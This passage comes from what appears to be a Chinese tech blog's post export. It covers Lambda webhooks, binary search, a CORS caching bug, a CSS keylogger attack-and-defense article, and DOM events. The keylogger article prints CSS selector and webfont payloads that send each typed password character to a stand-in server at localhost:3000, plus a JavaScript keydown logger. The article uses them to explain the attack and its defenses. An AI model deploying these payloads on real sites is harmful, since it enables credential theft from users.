上面這個排程的時間會以 UTC 為準，也就是 +0 的時區，所以你如果是寫說每天 00:00 跑，其實就代表說是在台灣的早上 08:00 跑。 我這邊設定的表達式是：5 0 ? * MON-FRI *，在台灣時間平日早上 08:05 都會觸發 Lambda，執行 po issue 的 function。 然後在 Lambda 的介面上如果你的程式碼沒有很大，可以直接編輯，有功能完整的編輯器（我一直覺得很眼熟，後來才想到應該是 Amazon 買了 Cloud9 的關係，以前上 CS50 都用 Cloud9 的 IDE，難怪這麼熟悉）： 最後把環境變數 token 設定好之後就完成了，測試一下發現 Issue 有成功被建立，第一個任務就這樣輕鬆完成了，感謝 Lambda 的努力。 2. 每個 Issue 下的留言要被同步到 Slack 這是三個任務當中最簡單的，因為 Slack 本來的優勢就是可以跟很多現成的東西串接，只要在 Slack 上面安裝 GitHub App，就可以用指令來 subscribe 指定的 repo 跟事件。 因為這個實在是太簡單，所以我就沒必要再多介紹了，直接給大家看成果： 3. 要串接 GitHub Webhook，同步把紀錄寫到試算表裡面 這個任務我們一樣用 Lambda 搭配其他 AWS 的服務就可以輕鬆實作出來，流程是這樣的： 學生留言，觸發 GitHub Webhook GitHub Webhook 打到 AWS API Gateway 經由 API Gateway 觸發 Labmda function Lambda function 透過 Google Sheet API 寫入試算表 我們先來把要丟給 webhook 的 API 給準備好，這邊利用 API Gateway 來觸發 Lambda，像是這樣： API Gateway 設定上也超級方便，你就設定要用什麼 HTTP method，他就會給你一個網址，假設我設定的是 GET，那你用 GET 打這個 API 它就會觸發 Lambda，用超短的時間就能做出一個 Webhook，比起自己架 Server 還要設定 domain 跟 https 方便得多。 再來就是要串接 Google Sheet API 了，我稍微看了一下官方的 API 發現還是維持一慣的風格，就是文件很完整但是講得很複雜，沒辦法一眼就看出我到底要怎麼實作出我要的功能，後來就找了一套別人包裝過的：Simple Google Spreadsheet Access (node.js)，用起來簡單很多。 最麻煩的權限管理裡面也有教你怎麼實作，基本上就是去開一個Service Account，設定成對 Google Drive API 有權限，然後再去產生這個帳號的 token，用那一組 token 就行了。 主程式要做的基本上就是先過濾資料，接著從 GitHub 丟過來的資料裡找到帳號，把帳號跟日期丟進我另外寫好的 function，最後回傳結果就結束了： 123456789101112131415161718192021222324252627282930var updateSheet = require('./lib') exports.handler = async (event, context, callback) =&gt; &#123; if (!event.body) return 'no body' const body = JSON.parse(event.body) || &#123;&#125; if (!body || body.action !== 'created') return response(callback) const title = body.issue.title.split(' ') if (!title.length) return response(callback) const date = title[1] const account = body.comment.user.login console.log('log:', date, account) try &#123; await updateSheet(date, account) return callback(null, &#123; statusCode: 200, body: date + account &#125;) &#125; catch (err) &#123; console.log('error:', err) &#125; return response(callback)&#125;; const response = (cb) =&gt; &#123; cb(null, &#123; statusCode: 200, body: 'ok' &#125;)&#125; updateSheet 這個 function 做的事也很簡單，就是根據日期還有帳號找到正確的位置，把那一格的值更改成 O 就好了，這邊附上部分程式碼供大家參考： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647async function searchAccount(sheet, account) &#123; const firstRow = await getCells(sheet, &#123; 'min-row': 1, 'max-row': 1 &#125;) const length = firstRow.length for(var i=0; i&lt;length; i++) &#123; if (firstRow[i].value === account) &#123; return &#123; col: firstRow[i].col, batchId: firstRow[i].batchId &#125; &#125; &#125; return null&#125; async function setValue(sheet, row, col, value) &#123; const cells = await getCells(sheet, &#123; 'min-row': row, 'max-row': row, 'min-col': col, 'max-col': col, 'return-empty': true &#125;) if (cells &amp;&amp; cells[0]) &#123; cells[0].value = value cells[0].save(function(err) &#123; if (err) &#123; console.log('err', err) &#125; &#125;) &#125;&#125; async function updateSheet(date, account) &#123; try &#123; const sheet = await getSheet() const accountPosition = await searchAccount(sheet, account) const datePosition = await searchDate(sheet, date) console.log('position:', accountPosition, datePosition) if (!accountPosition || !datePosition) return await setValue(sheet, datePosition.row, accountPosition.col, 'O') &#125; catch (err) &#123; console.log('err', err) &#125; &#125; 最後只要在 GitHub 那邊把 webhook 的網址設定好，一切就大功告成了！ 在 Lambda 上要如何 debug？ 雖然我上面寫的輕鬆寫意，但實際開發的時候我其實有碰到幾個小問題，第一個就是 debug 不像你在電腦上那樣可以直接看到結果，而且 webhook 通常又是比較難 debug 的一個。 有關於這部分，其實 Lambda 都會把 log 送到 CloudWatch 去，所以就是自己在 app 裡面寫 log，再去看 CloudWatch 分析一下那些 log，如果是簡單的應用的話還滿容易的，再複雜一點的話應該就是 function 要切更細，不然 debug 起來應該滿麻煩的。 另一個碰到的問題是 Google Sheet API 那邊速度比較慢，整個過程做完大概要 5 秒左右，預設的 timeout 好像是 3 秒左右，記得要自己把 timeout 加大不然會一直失敗。 總結 這次對於 AWS Lambda 的使用體驗滿不錯的，開發過程中沒碰到什麼太大的困難，可能跟我想實作的東西比較簡單也有關係，但這種簡單的東西我覺得超級適合走這種 Serverless 的方案，因為沒有 Server 真的超方便的，少了很多麻煩。 以後如果還有類似簡單的小需求，我想我應該還是會走這種解決方案，直接用現成服務一個串一個，把東西全部串起來就結束了。也推薦大家如果要做一些小東西，不妨來試試看用這些現成的服務搞定，可以節省很多時間。","link":"/2018/09/14/aws-lambda-and-github-api/"},{"title":"淺談二分搜尋法","text":"前言 在寫程式的時候，其實會滿常用到「搜尋」的功能，最簡單的搜尋就是在一串數字裡面找出你想要的數字，而這也是我們今天的主題。 這一篇大致上會分成三個部分，第一部分會先介紹線性搜尋法，第二部分介紹二分搜尋法，最後一部分談談二分搜尋法在不同條件底下的實作方式會有什麼不同。 線性搜尋法 為了由淺入深，我們從最基礎的線性搜尋法（Linear search）開始談起。 就如同它的名字一樣，線性搜尋法就是「從頭到尾一個一個找」，時間複雜度為 O(n)，很容易理解也很好實作 123456function linear_search(array, target)&#123; for(var i=0; i&lt;array.length; i++)&#123; if(array[i]==target) return i; &#125; return -1; //找不到&#125; 或是可以參考這個簡單的動畫，錄自Algorithm Visualizations 二分搜尋法 假如今天要搜尋的數列是有序的，我們便可以把線性搜尋法再做優化，使時間複雜度再更低一點 二分搜尋法的原理跟小時候大家玩「終極密碼」的流程十分類似，就是那個 1~99 要你猜數字的遊戲 為了快一點猜到（或是讓敵人快一點猜到），有些人第一個數字會喊 50，為什麼呢？ 因為無論數字是小於 50 或是大於 50，剩下能猜的數字一定會砍一半，變成原本的 1/2 假設下一次也繼續這樣砍對半，大概猜個七八次，就能「保證」一定猜得到 這邊可以做個簡單的小驗證： 如果只有 1 個數字，猜 1 次必定猜得到 如果只有 2 個數字，猜 2 次必定猜得到 如果只有 3 個數字，猜 2 次必定猜得到 如果只有 4 個數字，假設是 1 2 3 4 好了，切半猜 2，結果範圍變成 3 4，剩兩個數字，要猜 2 次 所以 4 個數字的話，猜 3 次一定猜得到 如果有 8 個數字，切半剩下 4 個，所以要猜 1 + 3 = 4 次 … 這樣繼續推廣下去，就會發現保證能猜到的次數與以 2 為底取 log 有關 詳細數學公式就不再贅述 所以呢，二分搜尋法的流程也非常簡單： 決定好左邊界 L，右邊界 R 取 (L+R)/2，作為這中間的數 M 如果 array[M] == 要找的數，return 如果 array[M]&gt;要找的數，表示 M~R 這一段數字都是不可能的（因為都比array[M]還要大），所以讓 R = M - 1 如果 array[M]&lt;要找的數，表示 L~M 這一段數字都是不可能的，所以讓 L = M + 1 如果 R&gt;=L，持續第 2 步，否則回傳 -1（代表找不到） 所以 L 跟 R 就會變得愈來愈靠近要找的數字，而且每一步都可以刪減掉一半的可能性 這邊的停止條件是「當L&gt;R」的時候，就代表找不到了 因為 L 代表的意義是：最左邊的有可能的值，換句話說，假如有答案的話，一定在 &gt;=L 的位置 R 代表的是：最右邊有可能的值，假如有答案，一定在 &lt;=R 的位置 所以當L &gt; R 的時候，&gt;=L 跟 &lt;=R 已經是空集合了，代表不可能有答案 這邊還有一個要特別注意的點是(L+R)/2這邊，當值很大的時候可能會造成 overflow 為了避免這種情形，可以改寫成(R-L)/2 + L 可以參考一樣從 Algorithm Visualizations 錄製的簡單動畫 （藍色是 L，黃色是 R，綠色是 M，要找的數字是 180） 1234567891011121314function binary_search(array, target) &#123; var L = 0, R = array.length - 1; while(L&lt;=R) &#123; var M = Math.floor((L+R)/2); if(array[M]==target)&#123; return M; &#125; else if(array[M]&gt;target) &#123; R = M - 1; &#125; else &#123; L = M + 1; &#125; &#125; return -1;&#125; 不同條件的二分搜尋法 剛剛所介紹的二分搜尋法，就只是要求在一連串數列裡面回答說有沒有找到，有的話在第幾個位置有 如果數列裡面有重複的數字，而且條件稍微變更一下成：回傳「第一個」出現的位置 例如說 1 2 2 2 2 2 3 3 要找 2，就回傳：1，因為第一個 2 出現在 index 為 1 的地方 或者，改成回傳「最後一個」出現的位置 同樣以上面那個例子來說，要回傳：5，因為 index 5 是最後一個 2 甚至還有稍微更複雜一點的，例如說以下四種： 回傳第一個 &gt;=target 的位置 回傳第一個 &gt;target 的位置 回傳最後一個 &lt;=target 的位置 回傳最後一個 &lt;target 的位置 （可參考：lower_bound） 再搭配上剛剛所說的找等於 target 的第一個與最後一個的位置 可以知道這樣的變形總共有 6 種，那該怎麼辦呢？ 其實原理都很類似，一樣是用二分搜尋去排除最多的數字，但是在一些條件判斷上會有些微差異 如果弄得不好的話，很容易會造成無窮迴圈，例如說找最後一個小於target 的數： 123456789101112function search(array, target)&#123; var L = 0, R = array.length - 1; while(L&lt;=R) &#123; var M = Math.floor((L+R)/2); if(array[M]&lt;target)&#123; L = M; &#125; else &#123; R = M - 1; &#125; &#125; return M;&#125; 我們拿這一組範例去跑：search([1,2,3,4,5],2) 剛開始 L=0, R=4, M=2 array[2] = 3 &gt; 2，所以 R = 2-1 = 1 接著 L=0, R = 1, M = 0 array[0] = 1 &lt; target，L = M = 0 然後就會再重複一樣的步驟，陷入無窮迴圈 這個就是寫二分搜的時候最常碰到的情況之一 一些條件沒有設定好，或許只是差一個等號或者是+1 -1，但就是搞不定 網路上可以找到許多文章，都是在講解應該要怎麼設定這些條件： 二分查找法的实现和应用汇总 漫谈二分查找-Binary Search 二分搜索法简单分析与总结 或是這篇知乎上的問答也有很多討論可以參考：二分查找有几种写法？它们的区别是什么？ 其中我最喜歡的是這個回答： 说到面试，其实这题的难点在于最后边界条件，那么我们根本不用判断那个边界，二分到区间小到一定程 度，比如5个元素以下，就顺序查找好了，反正也是O(lgN)的，而且最后5个元素顺序查找平均也只需要比较两三次而已，跟你二分差不多，我本人也很推荐在实际工程中这样写，可以规避很多麻烦的bug，用最稳妥的办法解决问题 這個思路我之前也有想過，既然±1或者要不要加等號這麼麻煩，那乾脆就不要加了吧！ 只要把終止條件改一下，判斷邏輯也改一下就好 一樣舉上面那個：找最後一個小於target 的數為例子 基本上的原則就是： 保證答案一定在閉區間 [L, R] 裡面 當這區間剩下的數很少時，改用線性搜尋 這樣就不用怕碰到無窮迴圈的問題了，下面附上程式碼： 12345678910111213141516171819202122232425// 傳回最後一個 &lt; target 的數function lower_bound(array, target) &#123; // 先看看是否沒答案 // 如果第一個數還是沒有 &lt; target，代表沒答案 if(array[0]&gt;=target) return -1; // 結束條件是區間內剩兩個數字的時候 var L = 0, R = array.length-1; while((R-L+1)&gt;2) &#123; var M = Math.floor((L+R)/2); if(array[M]&lt;target)&#123; L = M; &#125; else &#123; R = M - 1; &#125; &#125; // 在答案範圍內用線性搜尋 for(var i=R; i&gt;=L; i--)&#123; if(array[i]&lt;target)&#123; return i; &#125; &#125; &#125; 就算條件變得不一樣，例如說要找：&gt;=target, &lt;target 等等的，只要改一下條件，用差不多的架構就可以得到解答 結論 其實原本我是想好好研究一下在不同狀況下的二分搜，那些條件到底要怎麼訂，有沒有什麼統一的規則可以參考 但最後覺得還是文末給出的解法最方便，不但好想，而且還好寫 不用去顧慮那些&lt;&gt;=的符號跟+1-1的問題，在執行效率上也差不多 在演算法這一塊我也不是專業的，若是文章之中有哪部分有錯的話，還麻煩各位前輩指正 &lt;(_ _)&gt; 最後附上不嚴謹的測試與各種版本的 JavaScript 程式碼：https://repl.it/DgDU/1","link":"/2016/09/23/binary-search-introduction/"},{"title":"原來 CORS 沒有我想像中的簡單","text":"前言 CORS（Cross-Origin Resource Sharing，跨來源資源共享）在前端一直是個很經典的問題，簡單來說就是因為瀏覽器的一些安全考量，你在載入其他網域的資源時會受到一些限制，解決方法也很簡單，就是在 Server 那邊加上一些 response header 例如說 Access-Control-Allow-Origin，有了這個 header 之後瀏覽器就會認為你是有經過驗證的，就沒什麼問題了。 針對這個問題，我以前也有寫過一篇：輕鬆理解 Ajax 與跨來源請求，裡面把碰到的問題與解法寫得十分詳細。 我以為自從我上次深入研究過這個問題之後，從此以後 CORS 再也難不倒我，再也不會看到 console 跳出禁止跨來源存取的錯誤。 但是我錯了。 這次我在一個特定的使用場景之下摔了一跤，但也因此學到不少。而這次的經驗也讓我想起我以前寫的：我遇過的最難的 Cookie 問題 。 太好了，又有東西可以跟大家分享了！ 悲劇的開始 事情是這樣的，前陣子公司的產品改版進入收尾階段，嚴重的 bug 都修得差不多了，接下來就是要開始調整一些效能以及測試這次改版最重要的新功能：PWA！ 還不知道什麼是 PWA 的我在這邊簡單說明一下，PWA 全名是 Progressive Web App，簡單來說就是把你的 Mobile Web 透過一些瀏覽器的支援變得更像是一個 App，最重要的就是你可以用 Service Worker 來快取任何的 request（連 API request 也行），做得好的話甚至在 offline 的狀況也能夠把這個網頁打開。 除此之外呢，透過瀏覽器可以把你的網站加到主畫面，就像是安裝在手機裡面那樣，變得跟一個 App 沒有兩樣。 下面附上三張截圖，會讓大家對 PWA 更有感覺，首先第一張是你可以把這個網頁加入主畫面： 第二張是這個 PWA 就會跟其他的 Native App 一樣，存在你的手機裡面，你光看這頁絕對分不出來這到底是 Native App 還是 PWA。 最後一張是你開啟這個 PWA 之後，會變成全螢幕，光看這個截圖根本就跟 Native App 沒兩樣。 總之呢，可以把 PWA 想成：現有的網站 + 新技術（Service Worker、manifest.json…），搭配起來就可以變 PWA 了。 對 PWA 簡單的介紹就到這裡，想看更多的可以參考 @arvinh 寫過的：Progressive Web App 會是未來趨勢嗎？或是當 React web app 遇上 Progressive web app。 對 PWA 來說，其實最重要的就是這個 Service Worker（以下簡稱 SW），Chrome 內建的 Lighthouse 就可以針對網頁給一個 PWA 的分數，SW 就是其中一個考量的項目，因為你必須實作 SW 才能快取檔案並且實作出離線也能開啟 App 這個功能。 下圖是 Lighthouse 會檢測的項目： 好，前情提要結束，可以來進入正題了。 我們的 PWA 該做的都做了，有註冊 SW，也有實作離線可以開啟的功能，可是卻發生了一件事，那就是在 Lighthouse 的檢測裡面，有一項永遠都過不了，那就是註冊 SW。 無論檢驗多少次，Lighthouse 都一直說我們的網站沒有註冊 SW。 超級無敵奇怪，我開無痕用乾淨的 Chrome 手動去測試，無論怎麼測我都確認一定有註冊 SW，可是 Lighthouse 怎麼測都說沒有。 那怎麼辦呢？ 幸好 Lighthouse 是開源的，而且有提供 CLI 的版本，你可以自己在你電腦上面跑。 於是我想說既然 Lighthouse 說沒有，那我們就來看看 Lighthouse 是怎麼檢測的好了，然後我就稍微研究了一下 Lighthouse 的原始碼，覺得檢測的方法看起來也沒什麼問題，於是我決定把 Lighthouse 改一下，讓它跑完測試的時候不會把視窗關起來，這樣我就可以看 console 有沒有什麼有用的資訊，看看註冊成功會印的訊息有沒有印出來。 我稍微改動了幾個地方： 增加設定檔，只跑 SW 的測試 跑完之後不會把 Chrome 關掉 在 SW 的檢查那邊印 log 如果有需要的，我更改的部分在這邊：改動的地方的 PR 改完以後重新跑一遍測試，那一刻，我終於想起了被 CORS 困擾下的恐懼： 撥雲見日 既然有了一些線索就應該好好追查下去，從截圖裡面看起來，SW 是成功註冊了，但是在用 SW 快取檔案的時候碰到一些錯誤，所以好像連帶影響了整個測試。總之呢，只要把這個 CORS 問題解決掉就沒事了吧。 先幫大家再做個背景說明，我們這些靜態檔案都是放在 Amazon S3，然後前面再掛 Cloudfront，我們已經有乖乖按照 Amazon 的指示加上該加的東西，所以只要 request header 有 origin，response 就一定會有 CORS 的 header，所以一定不會發生這個錯誤。 而 SW 在快取檔案的時候是用 fetch，所以也一定會加上 origin 這個 header，沒理由出問題。 大概卡了一兩個小時還是還無頭緒，於是我決定看一下 network 的 tab，發現了更多線索： 下面這一張是從 SW 裡面發出的 request，header 裡面確實有 origin，可是 response 卻沒有 Access-Control-Allow-Origin！ 除此之外，發現更早以前也有一個相同的 request，因為這個 request 是由 &lt;script&gt; 發出的，所以不會帶上 origin，因此 response 也就沒有 CORS 的 header。 而這邊值得注意的事情是，第二個 response 是 from disk cache（雖然上面兩個都是，但那是因為我截圖的時候東西沒清空，事實上應該只有第二個是） 查線索查到這裡，大概有點頭緒了。 深入追查 好，讓我先來解釋一下。 SW 所要快取的那個檔案是頁面會載入的其中一個 JavaScript，而因為頁面會載入，所以在 HTML 裡面我們放了一個 &lt;script&gt; 的 tag 來載入這個檔案，從上面的圖片看起來，瀏覽器先載入了這個 JavaScript 檔案，然後因為這個檔案不是用 ajax 發出，所以沒有 origin，根據 S3 的規定，也就自然沒有 Access-Control-Allow-Origin。 再來呢，SW 註冊成功，開始執行裡面的程式碼把我們預先準備好的清單給快取住，其中一個就是這個 JavaScript 的檔案，但是當我們用 fetch 來抓這個檔案時，瀏覽器直接用了快取住的前一個的 response（因為 URL、method 都一樣），而這個 response 是沒有 Access-Control-Allow-Origin 的！因此就跳出了我們最前面看到的跨網域的錯誤。 到這邊真相大白了，都是瀏覽器快取的問題。 那為什麼我之前自己測都測不出來呢？因為身為一個前端工程師，devtool 有把「Disable cache」打勾是很合情合理的事，所以我怎麼試都試不出來這個問題。 知道問題的成因之後就比較簡單了，拜了 Google 大神查到了這一篇 Chromium 的 ticket：CORS Preflight Cache Does not Consider Origin 裡面碰到的問題基本上跟我碰到的差不多，最後給的解法是 response 加上一個 Vary: Origin，讓瀏覽器知道如果 Origin 不一樣的話就不要用快取，可是我發現我們早就加了但不知道為什麼沒用。 除此之外也找到幾個類似的問題： Chrome S3 Cloudfront: No ‘Access-Control-Allow-Origin’ header on initial XHR request S3 CORS, always send Vary: Origin 後來採用裡面其中一個的解法：「既然 S3 要有 origin header 才能開啟 CORS，那就用 Cloudfront 傳一個固定的 origin 給它吧！這樣每個 response 都一定會有 Access-Control-Allow-Origin 了！」 可以參考這篇：AWS CloudFront + S3 + Allow all CORS，基本上就是調一個設定而已。 這招聽起來滿有效的，但其實不是最好的解法，感覺有點骯髒，畢竟 origin 這東西不是這樣用的，為了 S3 的機制硬要這樣做總覺得不是太好。 於是最後我就想到一個東西，同時也解決了心中的一個疑惑。 那就是在&lt;script&gt;加上 crossorigin=&quot;anonymous&quot;，讓&lt;script&gt;發出去的 request 也有 origin header！ 我以前就看到某些地方會加這個，但始終不懂為什麼要加，因為 script 本來就可以不限制網域，為什麼還要特地加一個 tag 讓它變成像 ajax 那樣的 request？ 但沒想到我居然被這個屬性幫助到了，一旦我加了這個，那 script 的載入就會附上 Origin，S3 就會回傳 Access-Control-Allow-Origin，也就不會碰到之後的跨網域問題了！ 至於這個屬性其他的功用，可參考：Purpose of the crossorigin attribute …? 總結 要碰到我所碰到的這個問題，你必須同時滿足下面四個條件： 你把靜態檔案放在 S3 上面 你沒有勾選瀏覽器的 Disable cache 你用 script 跟 SW 載入同一個檔案 瀏覽器用快取的 script 的 response 回應 SW 的請求 只要任何一個條件沒有滿足，就不會碰到這問題。換句話說，要踩到這個坑其實也挺困難的。 但坑踩的越多就越強，解決了一個問題就代表你未來會碰到的問題又少了一個。解決掉這個 CORS 相關的問題，我想我以後應該不會再碰到相關的問題了…吧。","link":"/2018/08/18/cors-is-hard/"},{"title":"CSS keylogger：攻擊與防禦","text":"前言 前陣子在 Hacker News 上面看到這篇：Show HN: A CSS Keylogger，大開眼界，決定要找個時間好好來研究一下，並且寫一篇文章分享給大家。 這篇會講到以下東西： 什麼是 keylogger CSS keylogger 的原理 CSS keylogger 與 React 防禦方法 好，那就讓我們開始吧！ Keylogger 是什麼？ Keylogger 就是鍵盤側錄，是惡意程式的一種，拿來記錄你電腦上面所有按過的按鍵。還記得我小時候曾經用 VB6 寫了一個超簡單的 keylogger，只要呼叫系統提供的 API 並且記錄相對應的按鍵就好。 在電腦上面被裝這個的話，就等於你輸入的任何東西都被記錄起來。當然，也包含了帳號跟密碼。不過如果我沒記錯，防毒軟體的行為偵測應該可以把這些都擋掉，所以也不用太過擔心。 剛剛講的是在電腦上面，現在我們把範圍縮小，侷限在網頁。 如果你要在頁面上加一個 keylogger，通常會利用 JavaScript 來達成，而且程式碼超級簡單： 123document.addEventListener('keydown', e =&gt; &#123; console.log(e.key)&#125;) 只要偵測keydown事件並且抓出按下的 key 就行了。 不過假如你有能力在你想入侵的網頁上面加入 JavaScript 的話，通常也不需要這麼麻煩去記錄每個按鍵，你直接把 Cookie 偷走、竄改頁面、導到釣魚頁面，或者是在 submit 的時候把帳號密碼回傳給自己的 Server 就好，所以 keylogger 顯得不是那麼有用。 好，那假設我們現在沒辦法插入惡意的 JavaScript，只能改 CSS，有辦法用純 CSS 做出一個 keylogger 嗎？ 有，畢竟 CSS 能做的事情可多了。 純 CSS keylogger 的原理 直接看程式碼你就懂了（取自：maxchehab/CSS-Keylogging）： 123input[type=\"password\"][value$=\"a\"] &#123; background-image: url(\"http://localhost:3000/a\");&#125; 神奇吧！ 如果你不熟悉 CSS selector，這邊幫你複習一下。上面那段意思就是說如果 type 是 password 的 input，value 以 a 結尾的話，背景圖就載入http://localhost:3000/a 。 現在我們可以把這串 CSS 改一下，新增大小寫英文字母、數字甚至是特殊符號，接著會發生什麼事呢？ 如果我輸入 abc123，瀏覽器就會發送 Request 到： http://localhost:3000/a http://localhost:3000/b http://localhost:3000/c http://localhost:3000/1 http://localhost:3000/2 http://localhost:3000/3 就這樣，你的密碼就完全被攻擊者給掌握了。 這就是 CSS keylogger 的原理，利用 CSS Selector 搭配載入不同的網址，就能夠把密碼的每一個字元發送到 Server 去。 看起來很可怕對吧，別怕，其實沒那麼容易。 CSS keylogger 的限制 不能保證順序 雖然你輸入的時候是按照順序輸入的，但 Request 抵達後端的時候並不能保證順序，所以有時候順序會亂掉。例如說 abc123 變成 bca213 之類的。 但如果我們把 CSS Selector 改一下的話，其實就能解決這個問題： 1234567891011input[value^=\"a\"] &#123; background-image: url(\"http://localhost:3000/a_\");&#125; input[value*=\"aa\"] &#123; background-image: url(\"http://localhost:3000/aa\");&#125; input[value*=\"ab\"] &#123; background-image: url(\"http://localhost:3000/ab\");&#125; 如果開頭是 a，我們就送出a_，接著針對 26 個字母跟數字的排列組合每兩個字元送出一個 request，例如說：abc123，就會是： a_ ab bc c1 12 23 就算順序亂掉，透過這種關係你把字母重新組合起來，還是可以得到正確的密碼順序。 重複字元不會送出 Request 因為載入的網址一樣，所以重複的字元就不會再載入圖片，不會發送新的 Request。這個問題目前據我所知應該是解不掉。 在輸入的時候，其實 value 不會變 這個其實是 CSS Keylogger 最大的問題。 當你在 input 輸入資訊的時候，其實 input 的 value 是不會變的，所以上面講的那些完全不管用。你可以自己試試看就知道了，input 的內容會變，但是你用 dev tool 看的話，會發現 value 完全不會變。 針對這個問題，有兩個解決方案，第一個是利用 Webfont： 12345678910&lt;!doctype html&gt;&lt;title&gt;css keylogger&lt;/title&gt;&lt;style&gt;@font-face &#123; font-family: x; src: url(./log?a), local(Impact); unicode-range: U+61; &#125;@font-face &#123; font-family: x; src: url(./log?b), local(Impact); unicode-range: U+62; &#125;@font-face &#123; font-family: x; src: url(./log?c), local(Impact); unicode-range: U+63; &#125;@font-face &#123; font-family: x; src: url(./log?d), local(Impact); unicode-range: U+64; &#125;input &#123; font-family: x, 'Comic sans ms'; &#125;&lt;/style&gt;&lt;input value=\"a\"&gt;type `bcd` and watch network log （程式碼取自：Keylogger using webfont with single character unicode-range） value 不會跟著變又怎樣，字體總會用到了吧！只要每打一個字，就會送出相對應的 Request。 但這個方法的侷限有兩個： 沒辦法保證順序，一樣也沒辦法解決重複字元的問題 如果欄位是&lt;input type='password' /&gt;，就沒有用 （在研究第二個侷限的時候發現一件有趣的事，由於 Chrome 跟 Firefox 會把「頁面上有 type 是 password 的 input，但是又沒用 HTTPS」的網站標示為不安全，所以有人研究出用普通 input 搭配特殊字體來躲過這個偵測，並且讓輸入框看起來像是 password（但其實 type 不是 password），在這種情形下就可以用 Webfont 來攻擊了） 再來我們看第二種解決方案，剛剛有說到這個問題的癥結點在於 value 不會變，換句話說，如果你 input 輸入值的時候，value 會跟著變的話，這個攻擊手法就很用了。 嗯…有沒有一種很熟悉的感覺。 1234567891011121314151617181920212223class NameForm extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;value: ''&#125;; this.handleChange = this.handleChange.bind(this); &#125; handleChange(event) &#123; this.setState(&#123;value: event.target.value&#125;); &#125; render() &#123; return ( &lt;form&gt; &lt;label&gt; Name: &lt;input type=\"text\" value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/label&gt; &lt;/form&gt; ); &#125;&#125; （以上程式碼改寫自React 官網） 如果你用過 React 的話，應該會很熟悉這個模式。你在輸入任何東西的時候，會先改變 state，再把 state 的值對應到 input 的 value 去。因此你輸入什麼，value 就會是什麼。 React 是超夯的前端 Library，可以想像有一大堆網頁都是用 React 做的，而且只要是 React，幾乎就能保證 input 的 value 一定會同步更新（幾乎啦，但應該還是有少數沒有遵循這個規則）。 在這邊先做個總結，只要你 input 的 value 會對應到裡面的值（假如你用 React，幾乎一定會這樣寫），並且有地方可以讓別人塞入自訂的 CSS 的話，就能成功實作出 CSS Keylogger。雖然有些缺陷（沒辦法偵測重複字元），但概念上是可行的，只是精準度沒那麼高。 React 的回應 React 的社群也有針對這一個問題進行討論，都在 Stop syncing value attribute for controlled inputs #11896 這個 Issue 裡。 事實上，讓 input 的 value 跟輸入的值同步這件事情一直都會有一些 bug，以前甚至發生了知名流量分析網站 Mixpanel 不小心記錄敏感資訊的事件，而最根本的原因就是因為 React 會一直同步更新 value。 Issue 的討論滿值得一看的，裡面有提到大家常搞混的一件事情：Input 的 attributes 跟 properties。我找到 Stackover flow 上面一篇不錯的解釋：What is the difference between properties and attributes in HTML? attributes 基本上就是你 HTML 上面的那個東西，而 properties 代表的是實際的 value，兩個不一定會相等，舉例來說： 1&lt;input id=\"the-input\" type=\"text\" value=\"Name:\"&gt; 假如你今天抓這個 input 的 attribute，你會得到Name:，但如果你今天抓 input 的 value，你會得到目前在輸入框裡面的值。所以其實這個 attribute 就跟我們常用的 defaultValue 是一樣的意思，就是預設值。 不過在 React 裡面，他會把 attribute 跟 value 同步，所以你 value 是什麼，attribute 就會是什麼。 從討論看起來，在 React 17 滿有機會把這個機制拿掉，讓這兩者不再同步。 防禦方法 上面講了這麼多，因為現今 React 還沒把這個改掉，所以問題還是存在著。而且其實除了 React，也可能有別的 Library 做了差不多的事情。 Client 端的防禦方法我就不提了，基本就是裝一些別人寫好的 Chrome Extension，可以幫你偵測符合模式的 CSS 之類的，這邊比較值得提的是 Server 端的防禦。 目前看起來最一勞永逸的解決方案就是 Content-Security-Policy，簡而言之它是一個 HTTP Response 的 header，用來決定瀏覽器可以載入哪些資源，例如說禁止 inline 程式碼、只能載入同個 domain 下的資源之類的。 這個 Header 的初衷就是為了防止 XSS 以及攻擊者載入外部的惡意程式碼（例如說我們這個 CSS keylogger）。想知道更詳細的用法可以參考這篇：Content-Security-Policy - HTTP Headers 的資安議題 (2) 總結 不得不說，這個手法真的很有趣！之前第一次看到的時候也驚嘆了好一陣子，居然能發現這樣子的純 CSS Keylogger。雖然技術上是可行的，但在實作上還是會碰到許多困難之處，而且要符合滿多前提才能做這樣子的攻擊，不過還是很值得關注後續的發展。 總之呢，這篇文就是想介紹這個東西給讀者們，希望大家有所收穫。 參考資料 Keylogger using webfont with single character unicode-range #24 Stop syncing value attribute for controlled inputs #11896 maxchehab/CSS-Keylogging Content-Security-Policy - HTTP Headers 的資安議題 (2) Stealing Data With CSS: Attack and Defense Bypassing Browser Security Warnings with Pseudo Password Fields CSS Keylogger (and why you shouldn’t worry about it) Mixpanel JS library has been harvesting passwords","link":"/2018/03/12/css-keylogger/"},{"title":"DOM 的事件傳遞機制：捕獲與冒泡","text":"前言 （補充：感謝 othree 前輩的指點，指出這其實是在講 DOM 裡面事件傳遞的順序，因此把標題以及內文修正，原標題為：JavaScript 的事件傳遞機制：捕獲與冒泡） 今天為大家帶來的內容是 DOM 裡面的事件傳遞機制，而與這些事件相關的程式碼，相信大家應該不太陌生，就是addEventListener, preventDefault跟stopPropagation。 簡單來說，就是事件在 DOM 裡面傳遞的順序，以及你可以對這些事件做什麼。 為什麼會有「傳遞順序」這一詞呢？假設你有一個ul元素，底下有很多li，代表不同的 item。當你點擊任何一個li的時候，其實你也點擊了ul，因為ul把所有的li都包住了。 假如我在兩個元素上面都加了eventListener，哪一個會先執行？這時候呢，知道事件的執行順序就很重要。 另外，由於某些瀏覽器（沒錯，我就是在說 IE）的機制比較不太一樣，因此那些東西我完全不會提到，有興趣的可以研究文末附的參考資料。 簡單範例 為了之後方便說明，我們先寫一個非常簡單的範例出來： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;ul id=\"list\"&gt; &lt;li id=\"list_item\"&gt; &lt;a id=\"list_item_link\" target=\"_blank\" href=\"http://google.com\"&gt; google.com &lt;/a&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 在這個範例裡面，就是最外層一個ul，再來li，最後則是一個超連結。為了方便辨識，id 的取名也跟階層架構有關係。 DOM 畫成圖大概是長這樣： 有了這一個簡單的 HTML 結構之後，就可以很清楚的說明 DOM 的事件傳遞機制了。 事件的三個 Phase 要幫一個 DOM 加上 click 的事件，你會這樣寫： 